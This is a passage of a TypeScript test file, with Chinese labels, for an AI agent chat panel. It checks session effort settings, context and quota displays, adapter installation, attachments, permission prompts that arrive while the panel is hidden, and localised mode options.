    expect(sent("session/close")).toEqual([{ sessionId: "s1" }]);
    const load = sent("session/load")[0];
    expect(load).toMatchObject({ sessionId: "s1" });
    expect(effortOf(load)).toBe("medium");
    expect(host.querySelector(".agent-msg.is-user")?.textContent).toContain("之前问的");
    expect(sel("思考强度")!.value).toBe("medium");
  });

  it("Claude：选过的强度，新对话接着用", async () => {
    claudeLike();
    await mount();
    await choose("思考强度", "xhigh");
    await type("说句话");
    await act(async () => {
      host.querySelector<HTMLButtonElement>('[aria-label="新对话"]')!.click();
      await settle(120);
    });
    expect(effortOf(last(sent("session/new")))).toBe("xhigh");
  });

  it("上下文：画成一个圆环，悬停看数字和花费", async () => {
    state.script["session/prompt"] = (m) => {
      update({ sessionUpdate: "usage_update", used: 250000, size: 1000000, cost: { amount: 0.2, currency: "USD" } });
      reply(m.id, { stopReason: "end_turn" });
    };
    await mount();
    // 还没报过：圆环是空的，悬停说明数字什么时候来
    expect(host.querySelector(".agent-ctx")?.classList.contains("is-empty")).toBe(true);
    await type("你好");
    const ring = host.querySelector(".agent-ctx")!;
    expect(ring.getAttribute("aria-label")).toBe("上下文已用 25%");
    expect(ring.closest(".agent-usage")!.getAttribute("title")).toBe("上下文：250k / 1M（25%） · 这个对话花了 $0.20");
  });

  it("完全访问：权限那一格换成提醒色", async () => {
    state.script["session/new"] = (m) =>
      reply(m.id, {
        sessionId: "s1",
        configOptions: [
          {
            id: "mode",
            name: "Mode",
            category: "mode",
            type: "select",
            currentValue: "bypassPermissions",
            options: [
              { value: "default", name: "Default" },
              { value: "bypassPermissions", name: "Bypass Permissions" },
            ],
          },
        ],
      });
    await mount();
    const pick = sel("权限")!.closest(".agent-pick")!;
    expect(pick.classList.contains("is-risky")).toBe(true);
    expect(pick.textContent).toContain("完全访问");
  });
});

describe("常用适配器装在本机", () => {
  const CLAUDE = "npx -y @agentclientprotocol/claude-agent-acp";

  it("第一次用：先装一份，再直接运行它，不经 npx", async () => {
    const { api } = await import("../../../src/host/api");
    const start = api.agentStart as ReturnType<typeof vi.fn>;
    start.mockClear();
    await mount(undefined, CLAUDE);
    expect(api.agentInstall).toHaveBeenCalledWith("@agentclientprotocol/claude-agent-acp");
    expect(start).toHaveBeenCalledWith('node "C:/agents/@agentclientprotocol/claude-agent-acp/index.js"');
    // 起来之后在后台看一眼新版
    expect(api.agentUpdate).toHaveBeenCalledWith("@agentclientprotocol/claude-agent-acp");
  });

  it("装过的：直接运行，不再装", async () => {
    const { api } = await import("../../../src/host/api");
    (api.agentInstall as ReturnType<typeof vi.fn>).mockClear();
    state.installed = 'node "C:/agents/claude/index.js"';
    await mount(undefined, CLAUDE);
    expect(api.agentInstall).not.toHaveBeenCalled();
    expect(api.agentStart).toHaveBeenLastCalledWith('node "C:/agents/claude/index.js"');
  });

  it("自己填的命令照原样跑", async () => {
    const { api } = await import("../../../src/host/api");
    await mount();
    expect(api.agentStart).toHaveBeenLastCalledWith("fake-agent");
  });
});

describe("附件", () => {
  const promptBlocks = () =>
    (state.sent.find((m) => m.method === "session/prompt")!.params as { prompt: Record<string, unknown>[] }).prompt;

  beforeEach(() => {
    state.script["session/prompt"] = (m) => reply(m.id, { stopReason: "end_turn" });
  });

  it("「+」选的文件只交路径，让 AI 自己去读", async () => {
    state.picked = [String.raw`C:\Users\x\论文 草稿.pdf`];
    await mount({ path: null, selection: "" });
    await act(async () => {
      host.querySelector<HTMLButtonElement>('[aria-label="添加附件"]')!.click();
      await settle(30);
    });
    expect(host.querySelector(".agent-chip.is-attachment")?.textContent).toContain("论文 草稿.pdf");
    await type("总结这篇");
    expect(promptBlocks()[1]).toEqual({
      type: "resource_link",
      uri: "file:///C:/Users/x/%E8%AE%BA%E6%96%87%20%E8%8D%89%E7%A8%BF.pdf",
      name: "论文 草稿.pdf",
    });
    expect(host.querySelector(".agent-chip.is-attachment"), "发出去就清掉").toBeNull();
    expect(host.querySelector(".agent-user-ctx")?.textContent).toContain("论文 草稿.pdf");
  });

  /** 1×1 的 PNG */
  const PNG = Uint8Array.from(
    atob("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="),
    (c) => c.charCodeAt(0),
  );

  it("粘贴的截图带着内容走，对话里画成缩略图", async () => {
    await mount({ path: null, selection: "" });
    const ta = host.querySelector("textarea")!;
    const dt = new DataTransfer();
    dt.items.add(new File([PNG], "image.png", { type: "image/png" }));
    await act(async () => {
      ta.dispatchEvent(new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true }));
      await settle(80);
    });
    expect(host.querySelector(".agent-chip-thumb")).not.toBeNull();
    await type("这张图里是什么");
    expect(promptBlocks()[1]).toMatchObject({ type: "image", mimeType: "image/png" });
    expect((promptBlocks()[1] as { data: string }).data.startsWith("iVBOR")).toBe(true);
    expect(host.querySelector(".agent-user-images img")).not.toBeNull();
  });

  it("拖进来的：文本文件带内容，笔记带路径，读不了的说一声", async () => {
    await mount({ path: null, selection: "" });
    const panel = host.querySelector(".agent")!;
    const drop = async (dt: DataTransfer) => {
      await act(async () => {
        panel.dispatchEvent(new DragEvent("drop", { dataTransfer: dt, bubbles: true, cancelable: true }));
        await settle(60);
      });
    };
    const files = new DataTransfer();
    files.items.add(new File(["a,b\n1,2"], "数据.csv", { type: "" }));
    files.items.add(new File([new Uint8Array([1, 2, 3])], "压缩包.zip", { type: "application/zip" }));
    await drop(files);
    expect(host.querySelector(".agent-attach-notice")?.textContent).toContain("压缩包.zip");

    const note = new DataTransfer();
    note.setData("text/verso-path", "项目/甲.md");
    await drop(note);
    expect([...host.querySelectorAll(".agent-chip.is-attachment")].map((c) => c.textContent)).toEqual([
      "数据.csv",
      "项目/甲",
    ]);

    await type("看看");
    const blocks = promptBlocks();
    expect(blocks[1]).toMatchObject({ type: "resource", resource: { text: "a,b\n1,2" } });
    expect(blocks[2]).toMatchObject({ type: "resource_link", uri: "file:///D:/Notes/vault/%E9%A1%B9%E7%9B%AE/%E7%94%B2.md" });
  });
});

describe("关着的面板", () => {
  it("藏起来时来要许可：叫 App 把它弹出来", async () => {
    const onAttention = vi.fn();
    state.script["session/prompt"] = () =>
      emit({
        jsonrpc: "2.0",
        id: 0,
        method: "session/request_permission",
        params: {
          sessionId: "s1",
          toolCall: { toolCallId: "t", title: "Write 甲.md", kind: "edit" },
          options: [{ kind: "allow_once", name: "Allow", optionId: "allow" }],
        },
      });
    await mount();
    await type("改一下");
    // 发完就关掉面板：换成藏着的那一份
    await act(async () => {
      root!.render(
        <AgentPanel
          command="fake-agent"
          onPickCommand={() => {}}
          width={420}
          onWidthChange={() => {}}
          cover={false}
          onClose={() => {}}
          getContext={() => ({ path: null, selection: "" })}
          beforePrompt={async () => {}}
          onOpenPath={() => {}}
          onOpenSettings={() => {}}
          hidden
          onAttention={onAttention}
        />,
      );
      await settle(30);
    });
    expect(host.querySelector(".agent")!.classList.contains("is-hidden")).toBe(true);
    // 许可已经在路上了（剧本在发问时就发），再来一个让它在藏着时到
    await act(async () => {
      emit({
        jsonrpc: "2.0",
        id: 1,
        method: "session/request_permission",
        params: {
          sessionId: "s1",
          toolCall: { toolCallId: "t2", title: "Write 乙.md", kind: "edit" },
          options: [{ kind: "allow_once", name: "Allow", optionId: "allow" }],
        },
      });
      await settle(30);
    });
    expect(onAttention).toHaveBeenCalled();
  });
});

describe("额度和别的配置", () => {
  const sel = (label: string) => host.querySelector<HTMLSelectElement>(`.agent-bar select[aria-label="${label}"]`);

  it("Claude 报的额度：显示用得最多的那个窗口，悬停看每个窗口和重置时间", async () => {
    const reset = Math.floor(new Date(2030, 0, 2, 18, 0).getTime() / 1000);
    state.script["session/prompt"] = (m) => {
      // 照抄新版 claude-agent-acp：额度一次报一个窗口，塞在 _meta 里
      update({
        sessionUpdate: "usage_update",
        used: 50000,
        size: 1000000,
        _meta: { "_claude/rateLimit": { status: "allowed", rateLimitType: "five_hour", utilization: 0.34, resetsAt: reset } },
      });
      update({
        sessionUpdate: "usage_update",
        used: 50000,
        size: 1000000,
        _meta: { "_claude/rateLimit": { status: "allowed_warning", rateLimitType: "seven_day", utilization: 0.81 } },
      });
      reply(m.id, { stopReason: "end_turn" });
    };
    await mount();
    await type("你好");
    const usage = host.querySelector(".agent-usage")!;
    expect(usage.querySelector(".agent-quota")?.textContent).toBe("额度 81%");
    expect(usage.classList.contains("is-warn"), "快到头了要变色").toBe(true);
    const title = usage.getAttribute("title")!;
    expect(title).toContain("7 天额度：已用 81%");
    expect(title).toContain("5 小时额度：已用 34%，1月2日 18:00 重置");
  });

  it("没人报额度（Codex）：不画「额度」那几个字", async () => {
    state.script["session/prompt"] = (m) => {
      update({ sessionUpdate: "usage_update", used: 10, size: 100 });
      reply(m.id, { stopReason: "end_turn" });
    };
    await mount();
    await type("你好");
    expect(host.querySelector(".agent-quota")).toBeNull();
  });

  it("快速模式、协作模式这类：用中文名，选项写成「快速：开」", async () => {
    state.script["session/new"] = (m) =>
      reply(m.id, {
        sessionId: "s1",
        configOptions: [
          {
            id: "mode",
            name: "Mode",
            category: "mode",
            type: "select",
            currentValue: "workspace-write",
            options: [
              { value: "read-only", name: "Read-only" },
              { value: "workspace-write", name: "Workspace access" },
              { value: "agent", name: "Auto review" },
              { value: "agent-full-access", name: "Full access" },
            ],
          },
          {
            id: "fast-mode",
            name: "Fast mode",
            category: "model_config",
            type: "select",
            currentValue: "off",
            options: [
              { value: "off", name: "Off" },
              { value: "on", name: "On" },
            ],
          },
        ],
      });
    await mount();
    expect([...sel("权限")!.options].map((o) => o.textContent)).toEqual(["只读", "可改仓库", "只问有风险的", "完全访问"]);
    expect([...sel("快速")!.options].map((o) => o.textContent)).toEqual(["快速：关", "快速：开"]);
  });
});
